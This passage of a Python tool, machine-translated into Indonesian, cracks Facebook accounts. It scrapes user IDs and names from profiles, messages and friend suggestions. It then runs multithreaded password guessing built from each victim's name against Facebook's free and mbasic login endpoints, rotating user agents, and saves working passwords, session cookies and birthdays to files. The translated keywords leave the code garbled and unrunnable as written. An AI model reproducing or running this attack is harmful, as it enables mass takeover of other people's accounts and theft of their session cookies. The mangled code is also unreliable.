				jika "profile.php?" di saya[1]:
					self.id.append(re.findall("id=(.*?)&refid",i[1])[0]+"<=>"+i[2])
				lain:
					self.id.append(re.findall("(.*?)\?refid=",i[1])[0]+"<=>"+i[2])
				print(f"\r{U}{til}{O} menelan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
				jika len(self.id)==jum:
					benar=Benar
					merusak
			jika benar==Salah:
				jika "Lihat Hasil Selanjutnya" sebagai tanggapan:
					self.nama(parser(respon,"html.parser").find("a",string="Lihat Hasil Selanjutnya").get("href"),jum)
		kecuali:
			lulus
			
	# CRACK PESAN CHAT
	def pesan(diri, data_):
		mencoba:
			bs = parser(requests.get(data_, cookies=self.kueh).text, 'html.parser')
			print(f"\r{U}{til}{O} menelan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
			untuk saya di bs.find_all('a', href=True):
				if '/messages/read' di i.get('href'):
					f = bs4.re.findall('cid\\.c\\.(.*?)%3A(.*?)&', i.get('href'))
					mencoba:
						untuk ip dalam daftar (f.pop()):
							jika self.kueh.get(' c_user') di ip:
								melanjutkan
							lain:
								jika 'pengguna facebook' di i.text.lower():
									melanjutkan
								self.id.append(ip+"<=>"+i.text)
					kecuali Pengecualian sebagai e:
						melanjutkan
				if 'Lihat Pesan Sebelumnya' di i.text:
					self.pesan('https://mbasic.facebook.com/' + i.get('href'))
		kecuali:
			lulus
			
	#CRACK SARAN TEMAN
	def saran(sendiri, data_, jum):
		mencoba:
			benar = salah
			respon = request.get(data_, cookies=self.kueh).text
			otw = re.findall('\<a\ class\=\".."\ href\=\"/friends/hovercard/mbasic/\?uid=(\\d*).*?"\>(. *?)</a\>',respon)
			jika len(otw)!=0:
				untuk saya di otw:
					self.id.append(i[0]+"<=>"+i[1])
					print(f"\r{U}{til}{O} menelan Id {M}> {U}[{H}{len(self.id)}{U}] ",end="")
					jika len(self.id)==jum:
						benar=Benar
						merusak
			jika benar==Salah:
				if "Lihat selengkapnya" sebagai tanggapan:
					self.saran(self.url+parser(respon,"html.parser").find("a",string="Lihat selengkapnya").get("href"),jum)
		kecuali:
			lulus
			
# AGEN PENGGUNA
def user_agentAPI():
	mendesak =[
	    "Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Safari Seluler/537.36",
	    "Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/75.0.3396.81 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12",
	    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/90.0.4430.93 Safari/537.36",
	    "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)",
        "NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+",
        "NokiaX2-00/5.0 (08.35) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; en-us; nokiax2-00)",
        "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT ;FBAV/239.0.0.10.109;]",
        "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.2 (KHTML, seperti Gecko) ChromePlus/4.0.222.3 Chrome/4.0.222.3 Safari/532.2",
        "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/37.0.0.0 Mobile Safari/537.36",
        "Mozilla/5.0 (Linux; Android 5.1.1; Navori QL Stix 3500 Build/LMY49F; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/67.0.3396.87 Safari/537.36",
        "Mozilla/5.0 (Linux; Android 7.0; SM-G930F Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0.0.22 .69;]",
        "Mozilla/5.0 (Linux; Android 7.0; MHA-L29 Build/HUAWEIMHA-L29; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/127.0 .0.22.69;]",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 10_3_2 seperti Mac OS X) AppleWebKit/603.2.4 (KHTML, seperti Gecko) Mobile/14F89 [FBAN/FBIOS;FBAV/96.0.0.45.70;FBBV/60548545;FBDV/iPhone7 ,2;FBMD/iPhone;FBSN/iOS;FBSV/10.3.2;FBSS/2;FBCR/E-Plus;FBID/telepon;FBLC/de_DE;FBOP/5;FBRV/0]",
       "Mozilla/5.0 (Linux; Android 4.4.4; G7-L01 Build/HuaweiG7-L01) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/33.0.0.0 Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/121.0 .0.15.70;]",
       Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/ 14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW /1;]",
       "Mozilla/5.0 (Linux; Android 10; Redmi Note 9 Pro Build/QKQ1.191215.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/91.0.4472.77 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/ 325.0.0.36.170;]",
       "[FBAN/FB4A,FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/ HUAWEI;FBBD/HUAWEI,.FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19.FBCA/armeabi-v7a:armeabi,]"]
	rand_ua = random.choice(ugent)
	kembali rand_ua
	
# AGEN PENGGUNA GANTI
def agen pengguna():
	print ("\n%s%s%s 01 %sAgen pengguna anti "%(U,til,P,O))
	print ("%s%s%s 02 %sCek agen pengguna "%(U,til,P,O))
	print ("%s%s%s 00 %sKembali "%(U,til,M,O))
	_romz_ = input('\n%s#%s Pilih%s >%s '%(P,O,M,K))
	uas(_romz_)
	
def uas(_romz_):
	jika _romz_ == '':
		print('%s%s isi yang benar'%(M,til));jeda(2)
		uas(_romz_)
	elif _romz_ in("1","01"):
		print ("%s%s%s Ketik %sMy user agent%s di browser google chrome\n%s%s%s untuk menggunakan user agent anda sendiri"%(U,til,O,H,O,U,til ,HAI))
		print ("%s%s%s Ketik %sBatalkan%s untuk menggunakan alat bawaan agen pengguna"%(U,til,O,H,O))
		ua = input("%s%s%s Masukkan agen pengguna %s: %s"%(U,til,O,M,K))
		jika ua di(""):
			print("%s%s isi yang benar"%(M,til));jeda(2)
			Tidak bisa()
		elif ua in("agen pengguna saya", "Agen Pengguna Saya", "AGEN PENGGUNA SAYA", "Agen pengguna saya"):
			jalan("%s%s%s Anda akan diarahkan ke browser "%(U,til,O));jeda(2)
			os.system("saya mulai https://www.google.com/search?q=My+user+agent>/dev/null");jeda(2)
			agen pengguna(_romz_)
		elif ua in("BATAL","Batal","batal"):
			ua_ = ("Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA; FBLC/it_IT;FBAV/239.0.0.10.109;]")
			buka("ua.txt","w").write(ua_);jeda(2)
			print ("\n%s%s menggunakan user agent bawaan "%(H,til));jeda(2)
			Tidak bisa()
		buka("ua.txt","w").write(ua);jeda(2)
		print ("\n%s%s berhasil mengganti agen pengguna"%(H,til));jeda(2)
		Tidak bisa()
	elif _romz_ in("2", "02"):
		mencoba:
			ua_ = buka('ua.txt', 'r').read();jeda(2)
			print("%s%s%s agen pengguna anda%s : %s%s"%(U,til,O,M,H,ua_));jeda(2)
			input('\n%s%s%s [%s Masuk%s ] '%(U,til,O,U,O))
			Tidak bisa()
		kecuali IOError:
			ua_ = '%s-'%(M)
	elif _romz_ in("0","00"):
		Tidak bisa()
	lain:
		print('%s%s isi yang benar'%(M,til));jeda(2)
		uas(_romz_)
		
#REKAT MULAI
pwx = []
retak kelas:
	
	def __init__(sendiri):
		self.id = []
		self.url = "https://mbasic.facebook.com"
		
	def romiy (diri, id):
		self.id = id
		#print ('\n%s%s%s jumlah Id%s > %s%s'%(U,til,O,M,H,len(self.id)))
		unikers = input('\n%s%s%s gunakan manual kata sandi? y/t%s > %s'%(U,til,O,M,K))
		jika unikers di ('Y', 'y'):
			print ('\n%s%s%s contoh%s >%s sayang%s,%spengen%s,%sngentot'%(U,til,O,M,O,M,O,M,O))
			sementara Benar:
				pwx = input('%s%s%s sandi %s> %s'%(U,til,O,M,K))
				jika pwx == '':
					print ('\n%s%s jangan kosong '%(M,til))
				elif len(pwx)<=5:
					print ('\n%s%s password minimal 6 karakter'%(M,til))
					keluar()
				lain:
					def manual(brute=Tidak ada):
						ind = input('\n%s#%s Pilih %s>%s '%(P,O,M,K))
						jika ind =='':
							print("%s%s isi yang benar-benar kentod "%(M,til))
							petunjuk()
						elif ind di ('1', '01'):
							print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu) );jeda(0.2)
							print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O, M,K,waktu));jeda(0.2)
							jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
							dengan ThreadPoolExecutor(max_workers=30) sebagai TitidNeverDie:
								untuk akun di self.id:
									mencoba:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.touch, _heck_, brute)
									kecuali: lulus
							hasil(ok,cp)
						elif ind di ('2', '02'):
							print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu) );jeda(0.2)
							print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O, M,K,waktu));jeda(0.2)
							jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
							dengan ThreadPoolExecutor(max_workers=30) sebagai TitidNeverDie:
								untuk akun di self.id:
									mencoba:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.basic, _heck_, brute)
									kecuali: lulus
							hasil(ok,cp)
						elif ind di ('3', '03'):
							print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu) );jeda(0.2)
							print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O, M,K,waktu));jeda(0.2)
							jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
							dengan ThreadPoolExecutor(max_workers=30) sebagai TitidNeverDie:
								untuk akun di self.id:
									mencoba:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.mobil, _heck_, brute)
									kecuali: lulus
							hasil(ok,cp)
						lain:
							print ('\n%s%s isi yang benar-benar kentod'%(M,til))
							petunjuk()
					print ('\n%s•%s [ %spilih metode login, silahkan coba satu² %s]\n'%(U,O,U,O))
					print ('%s• %s01%s metode %sgratis %s(cepat) '%(U,P,O,M,O))
					print ('%s• %s02%s metode %sbasic %s(lambat) '%(U,P,O,P,O))
					print ('%s• %s03%s metode %smobile %s(sangat lambat) '%(U,P,O,H,O))
					manual(pwx.split(','))
					merusak
		elif unikers di ('T', 't'):
			print ('\n%s•%s [ %spilih metode login, silahkan coba satu²%s ]\n'%(U,O,U,O))
			cetak ('%s• %s01%s metode %sgratis %s(cepat)'%(U,P,O,M,O))
			print ('%s• %s02%s metode %sbasic %s(lambat) '%(U,P,O,P,O))
			print ('%s• %s03%s metode %smobile %s(sangat lambat) '%(U,P,O,H,O))
			diri.langsung()
		lain:
			print("%s%s Isi yang benar-benar kentod "%(M,til));jeda(2)
			pilihan().menu()
	
	#LANGSUNG
	def langsung(mandiri):
		pwx global
		#dari daftar impor data_peweh
		suuu = input('\n%s#%s Pilih %s>%s '%(P,O,M,K))
		jika suuu == '':
			print("%s%s Isi yang benar-benar kentod "%(M,til))
			diri.langsung()
		elif suuu di ('1', '01'):
			print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu) );jeda(0.2)
			print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O, M,K,waktu));jeda(0.2)
			jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
			dengan ThreadPoolExecutor(max_workers=30) sebagai TitidNeverDie:
				untuk akun di self.id:
					mencoba:
						uid, nama = akun.split('<=>')
						na = nama.split(' ')
						jika len(na) == 1:
							pwx = [nama, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 2:
							pwx = [nama, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 3:
							pwx = [nama, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 4:
							pwx = [nama, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						lain:
							pwx = [nama, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.touch, uid, pwx)
					kecuali: lulus
			hasil(ok,cp)
		elif suuu di ('2', '02'):
			print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu) );jeda(0.2)
			print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O, M,K,waktu));jeda(0.2)
			jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
			dengan ThreadPoolExecutor(max_workers=30) sebagai TitidNeverDie:
				untuk akun di self.id:
					mencoba:
						uid, nama = akun.split('<=>')
						ss = nama.split(' ')
						pwx = [ nama, ss[0]+ss[1], ss[0]+"123", ss[0]+"12345", ss[0]+"1234", "sayang", "kontol", "anjing" ]
						TitidNeverDie.submit(self.basic, uid, pwx)
					kecuali: lulus
			hasil(ok,cp)
		elif suuu di ('3', '03'):
			print ('\n%s%s%s akun %s[OK] %stersimpan ke file %s> %sOK/%s.txt'%(U,til,O,H,O,M,H,waktu) );jeda(0.2)
			print ('%s%s%s akun %s[%sCP%s]%s tersimpan ke file %s> %sCP/%s.txt'%(U,til,O,M,K,M,O, M,K,waktu));jeda(0.2)
			jalan ('\n%s!%s setiap crack 1k ID, mainkan mode pesawat 2 detik \n'%(U,O));jeda(0.2)
			dengan ThreadPoolExecutor(max_workers=30) sebagai TitidNeverDie:
				untuk akun di self.id:
					mencoba:
						uid, nama = akun.split('<=>')
						na = nama.split(' ')
						jika len(na) == 1:
							pwx = [nama, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 2:
							pwx = [nama, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 3:
							pwx = [nama, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						elif len(na) == 4:
							pwx = [nama, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						lain:
							pwx = [nama, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.mobil, uid, pwx)
					kecuali: lulus
			hasil(ok,cp)
		lain:
			print("%s%s Isi yang benar-benar kentod "%(M,til))
			diri.langsung()
			
	# MENYENTUH
	def touch(diri, pengguna, manual, **data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [crack] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s %s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		mencoba:
			untuk pw dalam manual:
				pw = pw.bawah()
				ses = permintaan.Sesi()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[ FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, seperti Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/27.0.87.90 Mobile Safari/ 537.36 NokiaBrowser/1.0,gzip(gfe)",,"Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/ 4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10;M2006C3MG) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"free.facebook.com","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml, application/xml;q=0.9,image/avif,image/webp,image/apng,*[disisipkan oleh cython untuk menghindari komentar lebih dekat]/[dimasukkan oleh cython untuk menghindari komentar dimulai]*;q=0.8,application/signed- exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin"," sec-fetch-mode":"cors","sec-fetch-user":"empty",,"sec-fetch-dest":"document","referer":"https://free.facebook.com/ ","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://free.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name= "jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":" https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https:// free.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM- N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, seperti Gecko) Versi/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9 ,image/avif,image/webp,image/apng,*[disisipkan oleh cython untuk menghindari komentar lebih dekat]/[disisipkan oleh cython untuk menghindari komentar dimulai]*;q=0.8,application/signed-exchange;v=b3;q =0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty",,"sec-fetch-dest":"document","referer":"https://free.facebook.com/ index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB ,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://free.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				jika "c_user" di ses.cookies.get_dict():
					mencoba:
						kukis=";".join([key+"="+nilai untuk kunci,nilai dalam ses.cookies.get_dict().items()])
						romz = buka('data/token.txt', 'r').read()
						lahir = request.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						hari, bulan, tahun = lahir.split('/')
						bulan = bulan12[bulan]
						print ('\r %s*--> %s %s %s %s %s %s '%(H,pengguna,pw,hari,bulan,tahun,kukis))
						os.popen("play-audio dapet.mp3")
						ok.append("%s %s %s %s %s %s "%(pengguna,pw,hari,bulan,tahun,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s %s %s %s %s %s \n"%(user,pw ,hari,bulan,tahun,kukis))
						cek_apk(kukis)
						merusak
					kecuali (KeyError, IOError):
						hari = ''
						bulan = ''
						tahun = ''
					kecuali:
						lulus
					print ('\r %s*--> %s %s %s '%(H,pengguna,pw,kukis))
					os.popen("play-audio dapet.mp3")
					ok.append('%s %s %s'%(pengguna,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' *--> %s %s %s\n'%(user,pw,kukis))
					cek_apk(kukis)
					merusak
				elif 'checkpoint' di ses.cookies.get_dict():
					mencoba:
						romz = buka('data/token.txt', 'r').read()
						lahir = request.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						hari, bulan, tahun = lahir.split('/')
						bulan = bulan12[bulan]
						print ('\r %s*--> %s %s ◊ %s %s %s '%(K,pengguna,pw,hari,bulan,tahun))
						os.popen("play-audio dapet.mp3")
						cp.append("%s %s %s %s %s"%(pengguna,pw,hari,bulan,tahun))
						open('CP/%s.txt' %(waktu), 'a').write(" *--> %s %s %s %s %s\n"%(user,pw,day, bulan tahun))
						merusak
					kecuali (KeyError, IOError):
						hari = ''
						bulan = ''
						tahun = ''
					kecuali:
						lulus
					print ('\r %s*--> %s %s '%(K,pengguna,pw))
					os.popen("play-audio dapet.mp3")
					cp.append('%s %s'%(pengguna,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" *--> %s %s\n"%(user,pw))
					merusak
				lain:
					melanjutkan
			lingkaran += 1
		kecuali request.exceptions.ConnectionError:
			jeda(1)
			lingkaran += 1
			self.touch(pengguna, manual, **data)
			
	#MBASIC
	def basic(self, user, manual,**data):
		global ok,cp,loop
		warna = random.choice([M, H, K, B, U, O, P, J])
		sys.stdout.write('\r'+warna+'•\x1b[1;96m [crack] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s %s%s]'%(loop,len(self.id),H,M,H,len(ok),O,K,M,K,len(cp),O)),
		sys.stdout.flush()
		mencoba:
			untuk pw dalam manual:
				pw = pw.bawah()
				ses = permintaan.Sesi()
				ua = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[ FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, seperti Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/27.0.87.90 Mobile Safari/ 537.36 NokiaBrowser/1.0,gzip(gfe)",,"Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/ 4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10;M2006C3MG) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
				headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC -1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, seperti Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/ webp,image/apng,*[disisipkan oleh cython untuk menghindari komentar lebih dekat]/[disisipkan oleh cython untuk menghindari komentar dimulai]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt" :"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec- fetch-user":"empty",,"sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
				p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name= "jazoest" value="(.*?)"', str(p)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":" https://developers.facebook.com/tools/debug/accesstoken/"}
				_headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https:// mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 ( KHTML, seperti Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp, image/apng,*[disisipkan oleh cython untuk menghindari komentar lebih dekat]/[disisipkan oleh cython untuk menghindari komentar dimulai]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested- dengan":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/ index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB ,en-US;q=0.9,en;q=0.8"}
				po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
				jika 'c_user' di ses.cookies.get_dict():
					mencoba:
						kukis=";".join([key+"="+nilai untuk kunci,nilai dalam ses.cookies.get_dict().items()])
						romz = buka('data/token.txt', 'r').read()
						lahir = request.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						hari, bulan, tahun = lahir.split('/')
						bulan = bulan12[bulan]
						print ('\r %s*--> %s %s %s %s %s %s '%(H,pengguna,pw,hari,bulan,tahun,kukis))
						os.popen("play-audio dapet.mp3")
						ok.append("%s %s %s %s %s %s "%(pengguna,pw,hari,bulan,tahun,kukis))
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s %s %s %s %s %s \n"%(user,pw ,hari,bulan,tahun,kukis))
						cek_apk(kukis)
						merusak
					kecuali (KeyError, IOError):
						hari = ''
						bulan = ''
						tahun = ''
					kecuali:
						lulus
					print ('\r %s*--> %s %s %s '%(H,pengguna,pw,kukis))
					os.popen("play-audio dapet.mp3")
					ok.append('%s %s %s'%(pengguna,pw,kukis))
					open('OK/%s.txt'%(waktu), 'a').write(' *--> %s %s %s\n'%(user,pw,kukis))
					cek_apk(kukis)
					merusak
				elif 'checkpoint' di ses.cookies.get_dict():
					mencoba:
						romz = buka('data/token.txt', 'r').read()
						lahir = request.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={romz}").json()['birthday']
						hari, bulan, tahun = lahir.split('/')
						bulan = bulan12[bulan]
						print ('\r %s*--> %s %s ◊ %s %s %s '%(K,pengguna,pw,hari,bulan,tahun))
						os.popen("play-audio dapet.mp3")
						cp.append("%s %s %s %s %s"%(pengguna,pw,hari,bulan,tahun))
						open('CP/%s.txt' %(waktu), 'a').write(" *--> %s %s %s %s %s\n"%(user,pw,day, bulan tahun))
						merusak
					kecuali (KeyError, IOError):
						hari = ''
						bulan = ''
						tahun = ''
					kecuali:
						lulus
					print ('\r %s*--> %s %s '%(K,pengguna,pw))
					os.popen("play-audio dapet.mp3")
					cp.append('%s %s'%(pengguna,pw))
					open('CP/%s.txt' %(waktu), 'a').write(" *--> %s %s\n"%(user,pw))
					merusak
				lain:
					melanjutkan
			lingkaran += 1
		kecuali request.exceptions.ConnectionError:
			jeda(1)
			lingkaran += 1
			self.basic(pengguna, manual, **data)
	
	# SELULER
	def mobil(sendiri, pengguna, manual,**data):
